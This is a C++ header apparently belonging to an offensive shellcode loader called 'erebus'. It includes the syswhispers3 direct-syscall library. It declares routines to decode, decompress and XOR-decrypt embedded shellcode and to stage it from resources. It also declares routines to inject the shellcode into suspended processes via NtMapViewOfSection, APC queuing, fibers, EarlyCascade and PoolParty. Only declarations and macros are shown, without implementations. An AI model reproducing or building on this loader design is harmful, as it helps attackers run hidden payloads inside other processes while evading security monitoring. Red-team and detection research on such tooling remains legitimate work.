#ifndef EREBUS_LOADER_HPP
#define EREBUS_LOADER_HPP
#pragma once
#include <windows.h>
#include "resource.h"
#include "syswhispers3.h"

#pragma region [typedefs]

typedef _Function_class_(PS_APC_ROUTINE)
VOID NTAPI PS_APC_ROUTINE(
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
);

typedef PS_APC_ROUTINE* PPS_APC_ROUTINE;

typedef NTSTATUS(NTAPI* typeRtlCompressBuffer)(
	_In_ USHORT CompressionFormatAndEngine,
	_In_reads_bytes_(UncompressedBufferSize) PUCHAR UncompressedBuffer,
	_In_ ULONG UncompressedBufferSize,
	_Out_writes_bytes_to_(CompressedBufferSize, *FinalCompressedSize) PUCHAR CompressedBuffer,
	_In_ ULONG CompressedBufferSize,
	_In_ ULONG UncompressedChunkSize,
	_Out_ PULONG FinalCompressedSize,
	_In_ PVOID WorkSpace
	);

typedef NTSTATUS(NTAPI* typeRtlDecompressBuffer)(
	_In_ USHORT CompressionFormat,
	_Out_writes_bytes_to_(UncompressedBufferSize, *FinalUncompressedSize) PUCHAR UncompressedBuffer,
	_In_ ULONG UncompressedBufferSize,
	_In_reads_bytes_(CompressedBufferSize) PUCHAR CompressedBuffer,
	_In_ ULONG CompressedBufferSize,
	_Out_ PULONG FinalUncompressedSize
	);

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)

#pragma endregion

#pragma region [macros]

#ifndef max
#define max(a,b)            (((a) > (b)) ? (a) : (b))
#endif

#ifndef min
#define min(a,b)            (((a) < (b)) ? (a) : (b))
#endif

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#define NERR_Success 0x00000000

#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40

#define WORKER_FACTORY_ALL_ACCESS 0xF00FF

#define LCG_A 1664525     // Multiplier (random choice, can be tuned)
#define LCG_C 1013904223  // Increment (random choice, can be tuned)
#define LCG_M 4294967296  // Modulus (2^32, typical for 32-bit PRNGs)

#define MAX_BUFFER_SIZE 1024

#define ImportModule(dll) \
	HMODULE dll = GetModuleHandleA(#dll)

#define ImportFunction(dll_module, type, function) \
	type function = (type) GetProcAddress(dll_module, #function)

#define COLOUR_DEFAULT "\033[0m"
#define COLOUR_BOLD "\033[1m"
#define COLOUR_UNDERLINE "\033[4m"
#define COLOUR_NO_UNDERLINE "\033[24m"
#define COLOUR_NEGATIVE "\033[7m"
#define COLOUR_POSITIVE "\033[27m"
#define COLOUR_BLACK "\033[30m"
#define COLOUR_RED "\033[31m"
#define COLOUR_GREEN "\033[32m"
#define COLOUR_YELLOW "\033[33m"
#define COLOUR_BLUE "\033[34m"
#define COLOUR_MAGENTA "\033[35m"
#define COLOUR_CYAN "\033[36m"
#define COLOUR_LIGHTGRAY "\033[37m"
#define COLOUR_DARKGRAY "\033[90m"
#define COLOUR_LIGHTRED "\033[91m"
#define COLOUR_LIGHTGREEN "\033[92m"
#define COLOUR_LIGHTYELLOW "\033[93m"
#define COLOUR_LIGHTBLUE "\033[94m"
#define COLOUR_LIGHTMAGENTA "\033[95m"
#define COLOUR_LIGHTCYAN "\033[96m"
#define COLOUR_WHITE "\033[97m"

#if _DEBUG
#include <stdio.h>
#define dprintf(fmt, ...)		printf(fmt, __VA_ARGS__)
#define LOG_SUCCESS(fmt, ...)	printf(COLOUR_BOLD COLOUR_GREEN   "[+]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
#define LOG_INFO(fmt, ...)		printf(COLOUR_BOLD COLOUR_BLUE    "[*]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
#define LOG_ERROR(fmt, ...)		printf(COLOUR_BOLD COLOUR_RED     "[!]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
#define LOG_DEBUG(fmt, ...)		printf(COLOUR_BOLD COLOUR_MAGENTA "[D]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
#else
#define dprintf(fmt, ...)     (0)
#define LOG_SUCCESS(fmt, ...) (0)
#define LOG_INFO(fmt, ...)	  (0)
#define LOG_ERROR(fmt, ...)	  (0)
#define LOG_DEBUG(fmt, ...)	  (0)
#endif

# pragma endregion

typedef VOID(*typeInjectionMethod)(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread);

namespace erebus {
	struct Config {
		typeInjectionMethod injection_method;
	};

	extern Config config;

	VOID DecompressionLZNT(_Inout_ BYTE* Input, IN SIZE_T InputLen);

	VOID DecompressionRLE(_Inout_ BYTE* Input, IN SIZE_T InputLen, OUT SIZE_T* OutputLen);

	BYTE DecodeBASE64Char(CHAR c);

	BOOL IsValidBase64Char(CHAR c);

	BOOL IsValidASCII85Char(CHAR c);

	BOOL IsValidALPHA32Char(CHAR c);

	BOOL IsValidWORDS256Format(_In_ const CHAR* Input, IN SIZE_T InputLen);

	BOOL DecodeASCII85(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen);

	BOOL DecodeALPHA32(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen);

	BOOL DecodeWORDS256(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen);

	VOID AutoDetectAndDecode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen);

	VOID AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen);

	VOID DecryptionXOR(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen);

	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size);

	PVOID WriteShellcodeInMemory(IN HANDLE process_handle, IN BYTE* shellcode, IN SIZE_T shellcode_size);

	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle);

	VOID InjectionNtMapViewOfSection(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);

	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);

	VOID InjectionCreateFiber(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);

	VOID InjectionEarlyCascade(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);

	VOID InjectionPoolParty(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
} // End of erebus namespace

#endif
